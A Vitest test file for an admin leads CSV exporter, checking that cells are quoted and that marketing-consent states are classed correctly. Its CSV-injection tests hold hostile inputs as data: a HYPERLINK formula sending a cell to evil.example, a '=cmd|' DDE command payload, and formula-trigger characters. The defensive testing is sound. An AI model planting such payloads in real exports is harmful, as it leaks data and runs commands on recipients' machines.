import { describe, it, expect } from "vitest";
import { LEAD_COLUMNS, csvCell, leadsCsv, marketingState, matchesLead, type LeadRow } from "@/components/admin/leads-csv";

const row: LeadRow = {
  id: "1", name: "Ana Petrovska", email: "ana@example.com", locale: "mk", source: "big-five", sources: ["big-five", "care"],
  marketing_consent: true, marketing_consent_at: "2026-10-30T10:00:00Z", marketing_consent_text: "Да", marketing_confirmed_at: "2026-10-30T11:00:00Z",
  unsubscribed_at: null, marketing_ok: true, privacy_version: "2026-10-31", welcome_sent_at: "2026-10-30T10:00:05Z", created_at: "2026-10-30T10:00:00Z", updated_at: "2026-10-30T11:00:00Z",
};

describe("csvCell", () => {
  it("neutralises every character a spreadsheet treats as a formula", () => {
    for (const v of ["=1+1", "+1", "-1", "@SUM(A1)", "|cmd", "%x", "\t=1", "\r=1", "\n=1", "  =1", " =1", "＝1", "＋1", "－1", "＠a"]) {
      expect(csvCell(v).startsWith(`"'`), JSON.stringify(v)).toBe(true);
    }
  });
  it("catches a real payload", () => {
    expect(csvCell(`=HYPERLINK("http://evil.example?"&A1,"click")`)).toBe(`"'=HYPERLINK(""http://evil.example?""&A1,""click"")"`);
  });
  it("leaves ordinary values alone", () => {
    expect(csvCell("Ana Petrovska")).toBe(`"Ana Petrovska"`);
    expect(csvCell("Марија")).toBe(`"Марија"`);
    expect(csvCell("a=b")).toBe(`"a=b"`);
    expect(csvCell("2026-10-30T10:00:00Z")).toBe(`"2026-10-30T10:00:00Z"`);
  });
  it("quotes so a value can't start a new cell or row", () => {
    expect(csvCell(`a"b`)).toBe(`"a""b"`);
    expect(csvCell("a,b")).toBe(`"a,b"`);
    expect(csvCell("a\r\nb")).toBe(`"a\r\nb"`);
  });
  it("handles empties, booleans and lists", () => {
    expect(csvCell(null)).toBe(`""`);
    expect(csvCell(undefined)).toBe(`""`);
    expect(csvCell(true)).toBe(`"true"`);
    expect(csvCell(["a", "b"])).toBe(`"a b"`);
    expect(csvCell(["=a", "b"])).toBe(`"'=a b"`);
  });
});

describe("leadsCsv", () => {
  it("opens with a byte order mark and uses CRLF", () => {
    const out = leadsCsv([row]);
    expect(out.charCodeAt(0)).toBe(0xfeff);
    expect(out.split("\r\n")).toHaveLength(3);
  });
  it("shows both double opt-in fields", () => {
    for (const c of ["marketing_confirmed_at", "unsubscribed_at", "marketing_ok"]) expect(LEAD_COLUMNS, c).toContain(c);
    const [head, line] = leadsCsv([{ ...row, unsubscribed_at: "2026-10-31T09:00:00Z" }]).split("\r\n");
    expect(head).toContain(`"marketing_confirmed_at"`);
    expect(line).toContain(`"2026-10-30T11:00:00Z"`);
    expect(line).toContain(`"2026-10-31T09:00:00Z"`);
  });
  it("neutralises a hostile row, whichever field it sits in", () => {
    const out = leadsCsv([{ ...row, name: "=cmd|' /C calc'!A0", marketing_consent_text: "@x", sources: ["+y"] }]);
    expect(out).toContain(`"'=cmd|' /C calc'!A0"`);
    expect(out).toContain(`"'@x"`);
    expect(out).toContain(`"'+y"`);
  });
});

describe("list helpers", () => {
  it("searches name, email, language and tests", () => {
    for (const q of ["petrov", "EXAMPLE", "mk", "care", ""]) expect(matchesLead(row, q), q).toBe(true);
    expect(matchesLead(row, "marko")).toBe(false);
  });
  it("only calls a lead confirmed when it counts as consent", () => {
    expect(marketingState(row)).toBe("ok");
    expect(marketingState({ ...row, marketing_ok: false, marketing_confirmed_at: null })).toBe("unconfirmed");
    expect(marketingState({ ...row, marketing_ok: false, marketing_consent: false, unsubscribed_at: "2026-10-31T09:00:00Z" })).toBe("unsubscribed");
    expect(marketingState({ ...row, marketing_ok: false, marketing_consent: true, unsubscribed_at: "2026-10-31T09:00:00Z", marketing_confirmed_at: null }), "a new tick can't undo an unsubscribe").toBe("unsubscribed");
    expect(marketingState({ ...row, marketing_ok: false, marketing_consent: false, marketing_confirmed_at: null })).toBe("none");
  });
});
